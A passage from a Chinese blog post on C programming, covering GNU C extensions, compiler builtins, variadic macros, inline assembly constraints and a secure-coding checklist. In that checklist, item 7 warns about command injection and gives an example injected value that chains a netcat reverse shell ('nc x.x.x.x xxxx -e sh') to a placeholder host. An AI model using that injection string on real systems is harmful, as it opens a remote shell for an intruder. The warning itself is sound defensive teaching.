<p>我们可以这样理解：内联函数为什么要定义在头文件中呢？因为它是一个内联函数，可以像宏一样使用，任何想使用这个内联函数的源文件，都不必亲自再去定义一遍，直接包含这个头文件，即可像宏一样使用。那么为什么还要用static修饰呢？因为我们使用inline定义的内联函数，编译器不一定会内联展开，那么当一个工程中多个文件都包含这个内联函数的定义时，编译时就有可能报重定义错误。而使用static关键字修饰，则可以将这个函数的作用域限制在各自的文件内，避免重定义错误的发生。</p>
<h3 id="内建函数"><a href="#内建函数" class="headerlink" title="内建函数"></a>内建函数</h3><p>内建函数，顾名思义，就是编译器内部实现的函数。这些函数和关键字一样，可以直接调用，无须像标准库函数那样，要先声明后使用。内建函数的函数命名，通常以<code>__builtin</code>开头。这些函数主要在编译器内部使用，主要是为编译器服务的。内建函数的主要用途如下。</p>
<ul>
<li>用来处理变长参数列表。</li>
<li>用来处理程序运行异常、编译优化、性能优化。</li>
<li>查看函数运行时的底层信息、堆栈信息等。</li>
<li>实现C标准库的常用函数。</li>
</ul>
<p>因为内建函数是在编译器内部定义的，主要供与编译器相关的工具和程序调用，所以这些函数并没有文档说明，而且变动又频繁，对于应用程序开发者来说，不建议使用这些函数。但有些函数，对于我们了解程序运行的底层机制、编译优化很有帮助，在Linux内核中也经常使用这些函数，所以我们很有必要了解Linux内核中常用的一些内建函数。</p>
<p>常用的内建函数主要有两个：<code>__builtin_return_address()</code>和<code>__builtin_frame_address()</code>。</p>
<p>**<code>__builtin_return_address(LEVEL)</code> ** 用来返回当前函数或调用者的返回地址</p>
<p>函数的参数LEVEL表示函数调用链中不同层级的函数。</p>
<ul>
<li>0：获取当前函数的返回地址。</li>
<li>1：获取上一级函数的返回地址。</li>
<li>2：获取上二级函数的返回地址。</li>
<li>……</li>
</ul>
<p><strong><code>__builtin_frame_address(LEVEL)</code></strong> 用来查看函数的栈帧地址。</p>
<p>函数的参数LEVEL表示函数调用链中不同层级的函数。</p>
<ul>
<li>0：查看当前函数的栈帧地址。</li>
<li>1：查看上一级函数的栈帧地址。</li>
<li>……</li>
</ul>
<hr>
<p><strong><code>__builtin_constant_p(n) </code></strong> 该函数主要用来判断参数n在编译时是否为常量。如果是常量，则函数返回1，否则函数返回0。该函数常用于宏定义中，用来编译优化。一个宏定义，根据宏的参数是常量还是变量，可能实现的方法不一样。在内核源码中，我们经常看到这样的宏。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220115844667.png"
                      alt="image-20250220115844667"
                ></p>
<hr>
<p><strong><code>__builtin_expect(exp，c)</code></strong></p>
<p>这个函数有2个参数，返回值就是其中一个参数，仍是exp。这个函数的意义主要是告诉编译器：参数exp的值为c的可能性很大，然后编译器可以根据这个提示信息，做一些分支预测上的代码优化。参数c与这个函数的返回值无关，无论c为何值，函数的返回值都是exp。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220120004292.png"
                      alt="image-20250220120004292"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220120017977.png"
                      alt="image-20250220120017977"
                ></p>
<p>这个函数的主要用途是编译器的分支预测优化。现在CPU内部都有Cache缓存器件。CPU的运行速度很高，而外部RAM的速度相对来说就低了不少，所以当CPU从内存RAM读写数据时就会有一定的性能瓶颈。为了提高程序执行效率，CPU一般都会通过Cache这个CPU内部缓冲区来缓存一定的指令或数据，当CPU读写内存数据时，会先到Cache看看能否找到：如果找到就直接进行读写；如果找不到，则Cache会重新缓存一部分数据进来。CPU读写Cache的速度远远大于内存RAM，所以通过这种缓存方式可以提高系统的性能。</p>
<p><strong>宏likely和unlikely</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220133319520.png"
                      alt="image-20250220133319520"
                ></p>
<p>这两个宏的主要作用就是告诉编译器：某一个分支发生的概率很高，或者很低，基本不可能发生。编译器根据这个提示信息，在编译程序时就会做一些分支预测上的优化。在这两个宏的定义中有一个细节，就是对宏的参数x做两次取非操作，这是为了将参数x转换为布尔类型，然后与1和0直接做比较，告诉编译器x为真或假的可能性很高。</p>
<p>编译器将小概率发生的if分支汇编代码放在了后面，将大概率发生的else分支的汇编代码放在了前面，这样就确保了程序在执行时，大部分时间都不需要跳转，直接按照顺序执行下面大概率发生的分支代码，可以提高缓存的命中率。</p>
<h3 id="可变参数宏"><a href="#可变参数宏" class="headerlink" title="可变参数宏"></a>可变参数宏</h3><p>宏连接符<code>##</code>的主要作用就是连接两个字符串。我们在宏定义中可以使用<code>##</code>来连接两个字符，预处理器在预处理阶段对宏展开时，会将<code>##</code>两边的字符合并，并删除<code>##</code>这个连接符。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220134042993.png"
                      alt="image-20250220134042993"
                ></p>
<p>知道了宏连接符<code>##</code>的使用方法，我们就可以对之前提到的s的<code>LOG</code>宏做一些修改。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220134158438.png"
                      alt="image-20250220134158438"
                ></p>
<p>我们在标识符<code>__VA_ARGS__</code>前面加上了宏连接符<code>##</code>，这样做的好处是：当变参列表非空时，<code>##</code>的作用是连接fmt和变参列表，各个参数之间用逗号隔开，宏可以正常使用；当变参列表为空时，＃＃还有一个特殊的用处，它会将固定参数fmt后面的逗号删除掉，这样宏就可以正常使用了。</p>
<hr>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220134613354.png"
                      alt="image-20250220134613354"
                ></p>
<p>这种格式是GNU C扩展的一个新写法：可以不使用<code>__VA_ARGS__</code>，而是直接使用args…来表示一个变参列表，然后在后面的宏定义中，直接使用args代表变参列表就可以了。和上面一样，为了避免变参列表为空时的语法错误，我们也需要在参数之间添加一个连接符<code>##</code>。</p>
<h3 id="当前函数名"><a href="#当前函数名" class="headerlink" title="当前函数名"></a>当前函数名</h3><p>GNU C语言为当前函数的名字准备了两个标识符，它们分别是<code>__PRETTY__FUNCTION__</code>和<code>__FUNCTION__</code>，其中<code>__FUNCTION__</code>标识符保存着函数在源码中的名字，<code>__PRETTY__FUNCTION__</code>标识符则保存着带有语言特色的名字。在C函数中，这两个标识符代表的函数名字相同，参考代码如下所示：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">func_example</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the function name is %s&quot;</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在C99标准中，只规定标识符<code>__func__</code>能够代表函数的名字，而<code>__FUNCTION__</code>虽被各类编译器广泛支持，但只是<code>__func__</code>标识符的宏别名。</p>
<h3 id="内联汇编"><a href="#内联汇编" class="headerlink" title="内联汇编"></a>内联汇编</h3><p>在很多操作系统开发场景中，C语言依然无法完全代替汇编语言。例如，操作某些特殊的CPU寄存器、操作主板上的某些IO端口或者对性能要求极为苛刻的场景等，此时我们必须在C语言内嵌入汇编语言来满足上述要求。GNU C语言提供了关键字asm来声明代码是内嵌的汇编语句，如下面这行代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> nop()     __asm__ __volatile__ (<span class="string">&quot;nop     \n\t&quot;</span>)</span></span><br></pre></td></tr></table></figure></div>

<p>C语言使用关键字<code>__asm__</code>和<code>__volatile__</code>对汇编语句加以修饰，这两个关键字在C语言内嵌汇编语句时经常使用。</p>
<ul>
<li><p><code>__asm__</code>关键字：用于声明这行代码是一个内嵌汇编表达式，它是关键字asm的宏定义（<code>#define __asm__ asm</code>）。故此，它是内嵌汇编语言必不可少的关键字，任何内嵌的汇编表达式都以此关键字作为开头；如果希望编写符合ANSI C标准的代码（即与ANSI C标准相兼容），那么建议使用关键字<code>__asm__</code>。</p>
</li>
<li><p><code>__volatile__</code>关键字：其作用是告诉编译器此行代码不能被编译器优化，编译时保持代码原状。由此看来，它也是内嵌汇编语言不可或缺的关键字，否则经过编译器优化后，汇编语句很可能被修改以至于无法达到预期的执行效果。如果期望编写处符合ANSI C标准的程序（即与ANSI C标准兼容），那么建议使用关键字<code>__volatile__</code>。</p>
</li>
</ul>
<p>GNU C语言的内嵌汇编表达式由4部分构成，它们之间使用<code>&quot;:&quot;</code>号分隔，其完整格式为：<strong>指令部分：输出部分：输入部分：损坏部分</strong></p>
<ul>
<li><p><strong>指令部分</strong>：汇编代码本身，其书写格式与AT&amp;T汇编语言程序的书写格式基本相同，但也存在些许不同之处。指令部分是内嵌汇编表达式的必填项，而其他部分视具体情况而定，如果不需要的话则可以直接忽略。在最简单的情况下，指令部分与常规汇编语句基本相同，如nop函数。</p>
<p>指令部分的编写规则要求是：当指令表达式中存在多条汇编代码时，可全部书写在一对双引号中；亦可将汇编代码放在多对双引号中。如果将所有指令编写在同一双引号中，那么相邻两条指令间必须使用分号（<code>;</code>）或换行符（<code>\n</code>）分隔。如果使用换行符，通常在其后还会紧跟一个制表符（<code>\t</code>）。当汇编代码引用寄存器时，必须在寄存器名前再添加一个 <code>%</code> 符，以表示对寄存器的引用，例如代码<code>&quot;movl $0x10, %%eax&quot;</code>。</p>
</li>
<li><p><strong>输出部分</strong>：紧接在指令部分之后，这部分记录着指令部分的输出信息，其格式为：<strong>“输出操作约束”（输出表达式）, “输出操作约束”（输出表达式）, ……</strong>。格式中的输出操作约束和输出表达式成对出现，整个输出部分可包含多条输出信息，每条信息之间必须使用逗号<code>&quot;,&quot;</code>分隔开。</p>
<ul>
<li>括号内的输出表达式部分主要负责保存指令部分的执行结果。通常情况下，输出表达式是一个变量。</li>
<li>双引号内的部分，被称为“输出操作约束”，也可简称为“输出约束”。输出约束部分必须使用等号<code>“=”</code>或加号<code>“+”</code>进行修饰。这两个符号的区别是，等号<code>“=”</code>意味着输出表达式是一个纯粹的输出操作，加号<code>“+”</code>意味着输出表达式既用于输出操作，又用于输入操作。不论是等号<code>“=”</code>还是加号<code>“+”</code>，它们只能用在输出部分，不能出现在输入部分，而且是可读写的。关于输出约束的更多内容，将在“操作约束和修饰符”中进行补充。</li>
</ul>
</li>
<li><p><strong>输入部分</strong>：记录着指令部分的输入信息，其格式为：<strong>“输入操作约束”（输入表达式）, “输入操作约束”（输入表达式）, ……</strong>。格式中的输入操作约束与输入表达式同样要求成对出现，整个输入部分亦可包含多条输入信息，并用逗号<code>“, ”</code>分隔开。在输入操作约束中<strong>不允许</strong>使用等号<code>“=”</code>和加号<code>“+”</code>，因此输入部分是只读的。</p>
</li>
<li><p><strong>损坏部分</strong>：描述了在指令部分执行的过程中，将被修改的寄存器、内存空间或标志寄存器，并且这些修改部分并未在输出部分和输入部分出现过，格式为：<strong>“损坏描述”, “损坏描述”, ……</strong>。如果需要声明多个寄存器，则必须使用逗号<code>“, ”</code>将它们分隔开，这点与输入&#x2F;输出部分一致。</p>
<ul>
<li><p><strong>寄存器修改通知</strong>。这种情况一般发生在寄存器出现于指令部分，又不是输入&#x2F;输出操作表达式指定的寄存器，更不是编译器为r或g约束选择的寄存器。如果该寄存器被指令部分所修改，那么就应该在损坏部分加以描述，比如下面这行代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__asm__ __volatile__ (<span class="string">&quot;movl %0, %%ecx&quot;</span>::<span class="string">&quot;a&quot;</span>(__tmp):<span class="string">&quot;cx&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>这段汇编表达式的指令部分修改了寄存器ECX的值，却未被任何输入&#x2F;输出部分所记录，那么必须在损坏部分加以描述，一旦编译器发现后续代码还要使用它，便会在内嵌汇编语句的过程中做好数据保存与恢复工作。如果未在损坏部分描述，则很可能会影响后续程序的执行结果。注意，已在损坏部分声明的寄存器，不能作为输入&#x2F;输出操作表达式的寄存器约束，也不会被指派为<code>q 、 r 、 g</code>约束的寄存器。如果在输入&#x2F;输出操作表达式中已明确选定寄存器，或者使用<code>q 、 r 、 g</code>约束让编译器指派寄存器时，编译器对这些寄存器的状态非常清楚，它知道哪些寄存器将会被修改。除此之外，编译器对指令部分修改的寄存器却一无所知。</p>
</li>
<li><p><strong>内存修改通知</strong>：除了寄存器的内容会被篡改外，内存中的数据同样会被修改。如果一个内嵌汇编语句的指令部分修改了内存数据，或者在内嵌汇编表达式出现的地方，内存数据可能发生改变，并且被修改的内存未使用m约束。此时，应该在损坏部分使用字符串memory，向编译器声明内存会发生改变。如果损坏部分已经使用memory对内存加以约束，那么编译器会保证在执行汇编表达式之后，重新向寄存器装载已引用过的内存空间，而非使用寄存器中的副本，以防止内存与副本中的数据不一致。</p>
</li>
<li><p><strong>标志寄存器修改通知</strong>：当内嵌汇编表达式中包含影响标志寄存器<code>R|EFLAGS</code>的指令时，必须在损坏部分使用<code>cc</code>来向编译器声明这一点。</p>
</li>
</ul>
</li>
</ul>
<hr>
<p><strong>操作约束和修饰符</strong></p>
<p>每个输入&#x2F;输出表达式都必须指定自身的操作约束。操作约束的类型可以细分为寄存器约束、内存约束和立即数约束。在输出表达式中，还有限定寄存器操作的修饰符。</p>
<ul>
<li><p><strong>寄存器约束</strong>限定了表达式的载体是一个寄存器，这个寄存器可以明确指派，亦可模糊指派再由编译器自行分配。寄存器约束可使用寄存器的全名，也可以使用寄存器的缩写名称，如下所示：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__asm__ __volatile__(<span class="string">&quot;movl %0, %%cr0&quot;</span>::<span class="string">&quot;eax&quot;</span>(cr0));</span><br><span class="line">__asm__ __volatile__(<span class="string">&quot;movl %0, %%cr0&quot;</span>::<span class="string">&quot;a&quot;</span>(cr0));</span><br></pre></td></tr></table></figure></div>

<p>如果使用寄存器的缩写名称，那么编译器会根据指令部分的汇编代码来确定寄存器的实际位宽。下表记录了常用的约束缩写名称。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250314172903564.png"
                      alt="image-20250314172903564"
                ></p>
</li>
<li><p><strong>内存约束</strong>限定了表达式的载体是一个内存空间，使用约束名m表示。例如以下内嵌汇编表达式：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__asm__ __volatile__ (<span class="string">&quot;sgdt %0&quot;</span>:<span class="string">&quot;=m&quot;</span>(__gdt_addr)::);</span><br><span class="line">__asm__ __volatile__ (<span class="string">&quot;lgdt %0&quot;</span>::<span class="string">&quot;m&quot;</span>(__gdt_addr));</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>立即数约束</strong>只能用于输入部分，它限定了表达式的载体是一个数值，如果不想借助任何寄存器或内存，那么可以使用立即数约束，比如下面这行代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__asm__ __volatile__(<span class="string">&quot;movl %0, %%ebx&quot;</span>::<span class="string">&quot;i&quot;</span>(<span class="number">50</span>));</span><br></pre></td></tr></table></figure></div>

<p>使用约束名<code>i</code>限定输入表达式是一个整数类型的立即数，如果希望限定输入表达式是一个浮点数类型的立即数，则使用约束名<code>F</code>。立即数约束只能使用在输入部分</p>
</li>
<li><p><strong>修饰符</strong>只可用在输出部分，除了等号 &#x3D; 和加号 + 外，还有 &amp; 符。符号 &amp; 只能写在输出约束部分的第二个字符位置上，即只能位于&#x3D;和 + 之后，它告诉编译器不得为任何输入操作表达式分配该寄存器。因为编译器会在输入部分赋值前，先对 &amp;符号修饰的寄存器进行赋值，一旦后面的输入操作表达式向该寄存器赋值，将会造成输入和输出数据混乱。</p>
<p>只有在输入约束中使用过模糊约束（使用q、r或g等约束缩写）时，在输出约束中使用符号&amp;修饰才有意义！如果所有输入操作表达式都明确指派了寄存器，那么输出约束再使用符号 &amp; 就没有任何意义。如果没有使用修饰符 &amp;，那就意味着编译器将先对输入部分进行赋值，当指令部分执行结束后，再对输出部分进行操作。</p>
</li>
</ul>
<p><strong>序号占位符</strong></p>
<p>序号占位符是输入&#x2F;输出操作约束的数值映射，每个内嵌汇编表达式最多只有10条输入&#x2F;输出约束，这些约束按照书写顺序依次被映射为序号0～9。如果指令部分想引用序号占位符，必须使用百分号%前缀加以修饰，例如序号占位符%0对应第1个操作约束，序号占位符%1对应第2个操作约束，依次类推。指令部分为了区分序号占位符和寄存器，特使用两个百分号(%%)对寄存器加以修饰。在编译时，编译器会将每个占位符代表的表达式替换到相应的寄存器或内存中。</p>
<p>指令部分在引用序号占位符时，可以根据需要指定操作位宽是字节或者字，也可以指定操作的字节位置，即在%与序号占位符之间插入字母b表示操作最低字节，或插入字母h表示操作次低字节</p>
<h2 id="现代-C-语言"><a href="#现代-C-语言" class="headerlink" title="现代 C 语言"></a>现代 C 语言</h2><h3 id="c99"><a href="#c99" class="headerlink" title="c99"></a>c99</h3><h3 id="c11"><a href="#c11" class="headerlink" title="c11"></a>c11</h3><h3 id="c17"><a href="#c17" class="headerlink" title="c17"></a>c17</h3><h3 id="c23"><a href="#c23" class="headerlink" title="c23"></a>c23</h3><p><a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/C23_(C_standard_revision)#Features" >c23新特性<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h2><h2 id="异步编程"><a href="#异步编程" class="headerlink" title="异步编程"></a>异步编程</h2><h2 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h2><h2 id="无锁编程"><a href="#无锁编程" class="headerlink" title="无锁编程"></a>无锁编程</h2><h2 id="异步信号安全"><a href="#异步信号安全" class="headerlink" title="异步信号安全"></a>异步信号安全</h2><p>详见《Linux环境编程与内核之信号》。</p>
<h2 id="代码和行为规范问题"><a href="#代码和行为规范问题" class="headerlink" title="代码和行为规范问题"></a>代码和行为规范问题</h2><p>这里并不能罗列所有问题和规范，还需经验总结和习惯。我以安全的视角来提醒一些程序员注意自己的代码规范问题。还有一些内容在其他文章里面。</p>
<p><strong>0. 把右值放在条件判断的左边</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">do_leap</span><span class="params">(<span class="type">const</span> <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="number">0</span> == y %<span class="number">4</span>  &amp;&amp; <span class="number">0</span> != y % <span class="number">100</span>) || <span class="number">0</span> == y % <span class="number">400</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这样做的好处是在大型的项目中，不小心把<code>==</code>写成<code>=</code>编译就会报错。否则编译不会出错但是会有警告，对于一些轻视警告的程序员来说这样的<code>bug</code>调试起来是十分费力的。</p>
<p><strong>1. 重视一切警告和单元测试</strong>。</p>
<p><strong>2. 把不希望被意外改变的变量传参时把形参定义为 const</strong></p>
<p><strong>3. 对字符串操作时使用带’n’的函数，即有长度限制的函数（避免溢内存出漏洞）</strong></p>
<p><strong>4. 不要直接将字符串指针放在格式化字符串函数中（避免格式化字符串漏洞）</strong></p>
<p><strong>5. 对于IO函数的选取，也要限制读取长度，并且不要超过栈&#x2F;堆上变量大小（避免内存溢出漏洞）</strong></p>
<p><strong>6. 不要使用<code>gets</code>, <code>strcpy</code>, <code>sprintf</code>, <code>memcpy</code>, <code>strcat</code>等危险函数（容易导致内存溢出漏洞）</strong></p>
<p><strong>7. 使用 <code>system</code> 和 <code>exec</code> 家族的函数 和 <code>popn</code> 等命令执行函数时，要过滤所有可能导致命令注入的字符串 “&amp;”  “$”  “|”  “&amp;&amp;”  “||”  “;”  “!”  “ `” 等潜在的命令注入字符。eg. system(“you_code; nc x.x.x.x xxxx -e sh;”)</strong></p>
<p><strong>8. 编译时加 -Wall 并且不要忽视任何警告信息</strong></p>
<p><strong>9. 不要忽略任何一次小的单元测试</strong></p>
<p><strong>10. 当不能使用简单点循环解决问题，再考虑递归函数，否则程序开销会很大</strong></p>
<p><strong>11. 循环数组时，数组的大小要用宏定义定义好，或者使用<code>sizeof</code>来计算数组的大小，这样修改数组的大小</strong></p>
<p><strong>12. 不要使用glibc的signal函数，它的历史负担太重，不同glibc版本和操作系统版本实现可能不同，语义模糊。Linux给出了语义更加精确的sigaction。</strong></p>
<h1 id="C-语言项目"><a href="#C-语言项目" class="headerlink" title="C 语言项目"></a>C 语言项目</h1><p>学之前可以先看一下博客中《数据结构与算法》《Linux环境编程系列》这几篇篇文章。我写的注释比较全了，哪里看不懂直接去找相关文章即可。</p>
<h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><h2 id="进程池"><a href="#进程池" class="headerlink" title="进程池"></a>进程池</h2><h2 id="内存池"><a href="#内存池" class="headerlink" title="内存池"></a>内存池</h2><h2 id="协程库"><a href="#协程库" class="headerlink" title="协程库"></a>协程库</h2><h2 id="无锁编程库"><a href="#无锁编程库" class="headerlink" title="无锁编程库"></a>无锁编程库</h2><p>打算使用引用计数来完成一个无锁编程库。</p>
<h2 id="高并发服务器"><a href="#高并发服务器" class="headerlink" title="高并发服务器"></a>高并发服务器</h2><h2 id="网络视频监控"><a href="#网络视频监控" class="headerlink" title="网络视频监控"></a>网络视频监控</h2><h2 id="TinyBox"><a href="#TinyBox" class="headerlink" title="TinyBox"></a>TinyBox</h2><p>项目链接：<a class="link"   target="_blank" rel="noopener" href="https://github.com/jelasin/tinybox.git" >https://github.com/jelasin/tinybox.git<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> C语言编程</li>
        <li><strong>Author:</strong> 韩乔落</li>
        <li><strong>Created at
                :</strong> 2025-01-23 14:44:14</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-03-14 17:34:43
            </li>
        
        <li>
            <strong>Link:</strong> https://jelasin.github.io/2025/01/23/C语言编程/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/01/23/C++%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B%E4%B9%8BBoost%E6%A0%87%E5%87%86%E5%BA%93/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">C++语言编程之Boost标准库</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/01/21/Qt6%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">Qt6开发指南</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'jelasin/jelasin.github.io',
                'data-repo-id': 'R_kgDOKVydDA',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDOKVydDM4CZe2W',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'not-lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">C语言编程</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-C-%E6%97%B6%E9%97%B4%E5%A4%84%E7%90%86"><span class="nav-text">Linux C 时间处理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%BC%E6%9E%97%E5%B0%BC%E6%B2%BB%E6%97%B6%E9%97%B4"><span class="nav-text">格林尼治时间</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="nav-text">时间数据类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0"><span class="nav-text">时间处理函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-text">示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E5%BA%93%E4%B8%8E%E9%9D%99%E6%80%81%E5%BA%93"><span class="nav-text">动态库与静态库</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E5%BA%93%EF%BC%88Static-Library%EF%BC%89"><span class="nav-text">静态库（Static Library）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E5%BA%93%EF%BC%88Dynamic-Library%EF%BC%89"><span class="nav-text">动态库（Dynamic Library）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GNU-C-%E6%89%A9%E5%B1%95%E8%AF%AD%E6%B3%95"><span class="nav-text">GNU C 扩展语法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E5%AE%9A%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-text">指定初始化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%AD%E5%8F%A5%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-text">语句表达式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8F%E5%AE%9A%E4%B9%89%E4%B8%AD%E7%9A%84%E8%AF%AD%E5%8F%A5%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-text">宏定义中的语句表达式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#typeof%E4%B8%8Econtainer-of%E5%AE%8F"><span class="nav-text">typeof与container_of宏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 